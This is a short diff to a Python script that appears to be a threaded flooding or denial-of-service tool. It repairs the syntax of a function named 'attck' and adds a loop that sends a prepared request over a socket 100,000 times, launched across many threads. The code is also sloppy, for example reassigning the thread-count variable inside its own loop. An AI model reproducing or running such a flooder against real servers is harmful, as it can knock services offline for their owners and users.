@@ -284,9 +284,11 @@ def start():
             s.close()
             print('[+] server error')
 def attck():
-    for i in range(100000)
-    print(i)
+    for i in range(100000):
+     print(i)
+     s.send(str.encode(main_req))
 attck()
+
 for x in range(th):
     thred = threading.Thread(target=start)
     th = threading.Thread(target=attck)
